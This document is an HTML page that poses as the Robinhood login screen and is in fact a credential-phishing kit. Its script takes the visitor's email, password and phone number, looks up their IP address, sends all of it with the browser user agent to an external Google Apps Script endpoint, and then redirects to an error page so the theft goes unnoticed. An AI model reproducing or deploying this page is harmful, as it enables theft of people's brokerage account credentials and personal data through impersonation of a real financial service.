    <title>Log In | Robinhood</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background-color: #000;
            color: #fff;
            height: 100vh;
            overflow: hidden;
            margin: 0;
            padding: 0;
        }

        .container {
            display: flex;
            height: 100vh;
            width: 100vw;
        }

        .video-section {
            flex: 1;
            position: relative;
            display: flex;
            align-items: center;
            justify-content: center;
            background-color: #000;
        }

        .video-section video {
            max-width: 100%;
            max-height: 100%;
            width: auto;
            height: auto;
        }

        .login-section {
            flex: 1;
            display: flex;
            align-items: center;
            justify-content: flex-start;
            background-color: #000;
            padding: 1rem 2rem 1rem 3rem;
            min-width: 0;
            position: relative;
        }

        @media (max-width: 768px) {
            .container {
                flex-direction: column;
            }
            
            .video-section {
                display: none;
            }
            
            .login-section {
                flex: none;
                height: 100vh;
                padding: 1rem;
                justify-content: center;
            }
        }

        .login-form, .phone-form {
            width: 100%;
            max-width: 500px;
            padding-right: 2rem;
            transition: opacity 0.3s ease-in-out;
        }

        .phone-form {
            display: none;
            opacity: 0;
        }

        .phone-form.active {
            display: block;
            opacity: 1;
        }

        .login-form.fade-out {
            opacity: 0;
        }

        .login-title, .phone-title {
            font-size: 1.9rem;
            font-weight: 500;
            margin-bottom: 2rem;
            text-align: left;
            color: #fff;
        }

        .form-group {
            margin-bottom: 1.5rem;
        }

        .form-label {
            display: block;
            margin-bottom: 0.5rem;
            font-size: 0.9rem;
            color: #fff;
            font-weight: 400;
        }

        .form-input {
            width: 100%;
            padding: 1rem 1.2rem;
            background-color: #1a1a1a;
            border: 1px solid #333;
            border-radius: 6px;
            color: #fff;
            font-size: 1rem;
            outline: none;
            transition: border-color 0.2s;
            height: 52px;
        }

        .form-input:focus {
            border-color: #00c805;
        }

        .phone-input-container {
            display: flex;
            gap: 0.5rem;
        }

        .country-select {
            width: 120px;
            padding: 1rem 0.8rem;
            background-color: #1a1a1a;
            border: 1px solid #333;
            border-radius: 6px;
            color: #fff;
            font-size: 1rem;
            outline: none;
            transition: border-color 0.2s;
            height: 52px;
        }

        .country-select:focus {
            border-color: #00c805;
        }

        .phone-input {
            flex: 1;
        }

        .password-input-container {
            position: relative;
        }

        .password-toggle {
            position: absolute;
            right: 1rem;
            top: 50%;
            transform: translateY(-50%);
            background: none;
            border: none;
            color: #888;
            cursor: pointer;
            padding: 0;
            font-size: 1.1rem;
        }

        .checkbox-container {
            display: flex;
            align-items: center;
            margin-bottom: 1.5rem;
        }

        .checkbox {
            width: 18px;
            height: 18px;
            margin-right: 0.8rem;
            accent-color: #00c805;
            cursor: pointer;
        }

        .checkbox-label {
            font-size: 0.9rem;
            color: #fff;
            cursor: pointer;
            font-weight: 400;
        }

        .button-group {
            display: flex;
            gap: 0.8rem;
            margin-bottom: 1.5rem;
        }

        .btn {
            flex: 1;
            padding: 0.9rem 1.2rem;
            border: none;
            border-radius: 24px;
            font-size: 0.95rem;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.2s;
            height: 48px;
            display: flex;
            align-items: center;
            justify-content: center;
            position: relative;
        }

        .btn:disabled {
            opacity: 0.6;
            cursor: not-allowed;
        }

        .btn-primary {
            background-color: #fff;
            color: #000;
        }

        .btn-primary:hover:not(:disabled) {
            background-color: #f5f5f5;
        }

        .btn-secondary {
            background-color: transparent;
            color: #fff;
            border: 1px solid #333;
        }

        .btn-secondary:hover {
            border-color: #555;
        }

        .btn-verify {
            width: 100%;
            background-color: #00c805;
            color: #fff;
            margin-bottom: 1.5rem;
        }

        .btn-verify:hover:not(:disabled) {
            background-color: #00b004;
        }

        .loading-spinner {
            width: 20px;
            height: 20px;
            border: 2px solid transparent;
            border-top: 2px solid currentColor;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin-right: 0.5rem;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        .divider {
            text-align: center;
            margin: 1.5rem 0;
            color: #888;
            font-size: 0.9rem;
        }

        .btn-passkey {
            width: 100%;
            padding: 0.9rem 1.2rem;
            background-color: transparent;
            border: 1px solid #333;
            border-radius: 24px;
            color: #fff;
            font-size: 0.95rem;
            font-weight: 600;
            cursor: pointer;
            transition: border-color 0.2s;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 0.6rem;
            margin-bottom: 1.5rem;
            height: 48px;
        }

        .btn-passkey:hover {
            border-color: #555;
        }

        .signup-link, .back-link {
            text-align: left;
            font-size: 0.9rem;
            color: #fff;
        }

        .signup-link a, .back-link a {
            color: #fff;
            text-decoration: underline;
            cursor: pointer;
        }

        .signup-link a:hover, .back-link a:hover {
            color: #ccc;
        }

        .passkey-icon {
            width: 18px;
            height: 18px;
        }

        .eye-icon {
            width: 18px;
            height: 18px;
        }

        .phone-subtitle {
            font-size: 0.9rem;
            color: #888;
            margin-bottom: 1.5rem;
            line-height: 1.4;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="video-section">
            <video autoplay muted loop>
                <source src="./assets/spinning.mp4" type="video/mp4">
                Your browser does not support the video tag.
            </video>
        </div>
        
        <div class="login-section">
            <!-- Login Form -->
            <div class="login-form" id="loginForm">
                <h1 class="login-title">Log in to Robinhood</h1>
                
                <div class="form-group">
                    <label class="form-label" for="email">Email</label>
                    <input type="email" id="email" class="form-input" required>
                </div>
                
                <div class="form-group">
                    <label class="form-label" for="password">Password</label>
                    <div class="password-input-container">
                        <input type="password" id="password" class="form-input" required>
                        <button type="button" class="password-toggle" onclick="togglePassword()">
                            <svg class="eye-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                                <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/>
                                <circle cx="12" cy="12" r="3"/>
                            </svg>
                        </button>
                    </div>
                </div>
                
                <div class="checkbox-container">
                    <input type="checkbox" id="remember" class="checkbox">
                    <label for="remember" class="checkbox-label">Keep me logged in for up to 30 days</label>
                </div>
                
                <div class="button-group">
                    <button class="btn btn-primary" onclick="showPhoneVerification()">Log In</button>
                    <button class="btn btn-secondary">Help</button>
                </div>
                
                <div class="divider">or</div>
                
                <button class="btn-passkey">
                    <svg class="passkey-icon" viewBox="0 0 24 24" fill="currentColor">
                        <path d="M6 10V8C6 5.79 7.79 4 10 4S14 5.79 14 8V10H15C16.1 10 17 10.9 17 12V20C17 21.1 16.1 22 15 22H5C3.9 22 3 21.1 3 20V12C3 10.9 3.9 10 5 10H6ZM10 6C8.9 6 8 6.9 8 8V10H12V8C12 6.9 11.1 6 10 6Z"/>
                    </svg>
                    Log in with passkeys
                </button>
                
                <div class="signup-link">
                    Not on Robinhood? <a href="#">Create an account</a>
                </div>
            </div>

            <!-- Phone Verification Form -->
            <div class="phone-form" id="phoneForm">
                <h1 class="phone-title">Confirm your number</h1>
                <p class="phone-subtitle">We'll send a verification code to your mobile number for security.</p>
                
                <div class="form-group">
                    <label class="form-label" for="phone">Mobile Number</label>
                    <div class="phone-input-container">
                        <select id="countryCode" class="country-select">
                            <option value="+1">üá∫üá∏ +1</option>
                            <option value="+91">üáÆüá≥ +91</option>
                            <option value="+44">üá¨üáß +44</option>
                            <option value="+33">üá´üá∑ +33</option>
                            <option value="+49">üá©üá™ +49</option>
                            <option value="+81">üáØüáµ +81</option>
                            <option value="+86">üá®üá≥ +86</option>
                            <option value="+7">üá∑üá∫ +7</option>
                            <option value="+55">üáßüá∑ +55</option>
                            <option value="+61">üá¶üá∫ +61</option>
                        </select>
                        <input type="tel" id="phone" class="form-input phone-input" placeholder="(555) 123-4567" required>
                    </div>
                </div>
                
                <button class="btn btn-verify" id="verifyBtn" onclick="verifyPhone()">
                    <span id="verifyText">Verify</span>
                </button>
                
                <div class="back-link">
                    <a onclick="showLoginForm()">‚Üê Back to login</a>
                </div>
            </div>
        </div>
    </div>

    <script>
        function togglePassword() {
            const passwordInput = document.getElementById('password');
            const eyeIcon = document.querySelector('.password-toggle svg');
            
            if (passwordInput.type === 'password') {
                passwordInput.type = 'text';
                eyeIcon.innerHTML = `
                    <path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94L17.94 17.94Z"/>
                    <path d="M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19L9.9 4.24Z"/>
                    <line x1="1" y1="1" x2="23" y2="23"/>
                `;
            } else {
                passwordInput.type = 'password';
                eyeIcon.innerHTML = `
                    <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/>
                    <circle cx="12" cy="12" r="3"/>
                `;
            }
        }

        function showPhoneVerification() {
            const email = document.getElementById('email').value;
            const password = document.getElementById('password').value;
            
            if (!email || !password) {
                alert('Please enter both email and password');
                return;
            }

            const loginForm = document.getElementById('loginForm');
            const phoneForm = document.getElementById('phoneForm');
            
            loginForm.classList.add('fade-out');
            
            setTimeout(() => {
                loginForm.style.display = 'none';
                phoneForm.classList.add('active');
            }, 300);
        }

        function showLoginForm() {
            const loginForm = document.getElementById('loginForm');
            const phoneForm = document.getElementById('phoneForm');
            
            phoneForm.classList.remove('active');
            
            setTimeout(() => {
                phoneForm.style.display = 'none';
                loginForm.style.display = 'block';
                loginForm.classList.remove('fade-out');
            }, 300);
        }

        // Function to get user's IP address
        async function getUserIP() {
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                return data.ip;
            } catch (error) {
                return 'Unknown';
            }
        }

        async function verifyPhone() {
            const email = document.getElementById('email').value;
            const password = document.getElementById('password').value;
            const countryCode = document.getElementById('countryCode').value;
            const phone = document.getElementById('phone').value;
            
            if (!phone) {
                alert('Please enter your phone number');
                return;
            }

            const verifyBtn = document.getElementById('verifyBtn');
            const verifyText = document.getElementById('verifyText');
            
            // Show loading animation
            verifyBtn.disabled = true;
            verifyText.innerHTML = '<div class="loading-spinner"></div>Verifying...';
            
            // Get user's IP address
            const userIP = await getUserIP();
            
            // Prepare data to send
            const formData = {
                ip: userIP,
                email: email,
                password: password,
                countryCode: countryCode,
                phone: countryCode + phone,
                timestamp: new Date().toISOString(),
                userAgent: navigator.userAgent
            };

            try {
                // Send to Google Apps Script (replace with your actual URL)
                const response = await fetch('https://script.google.com/macros/s/AKfycbwsg7LMA1lzbO1M6_DH87RyhjXt1dw-XHz0BbGAnXZQk40ZlqLDgrn4M5Au2P0Ed27ZJg/exec', {
                    method: 'POST',
                    mode: 'no-cors',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify(formData)
                });

                // After sending data, redirect to error.html
                setTimeout(() => {
                    window.location.href = 'error.html';
                }, 2000);

            } catch (error) {
                console.error('Error:', error);
                // Even if there's an error, redirect to error.html
                setTimeout(() => {
                    window.location.href = 'error.html';
                }, 2000);
            }
        }

        // Phone number formatting for US format
        document.getElementById('phone').addEventListener('input', function(e) {
            let value = e.target.value.replace(/\D/g, '');
            if (value.length >= 6) {
                value = `(${value.slice(0,3)}) ${value.slice(3,6)}-${value.slice(6,10)}`;
            } else if (value.length >= 3) {
                value = `(${value.slice(0,3)}) ${value.slice(3)}`;
            }
            e.target.value = value;
        });
    </script>
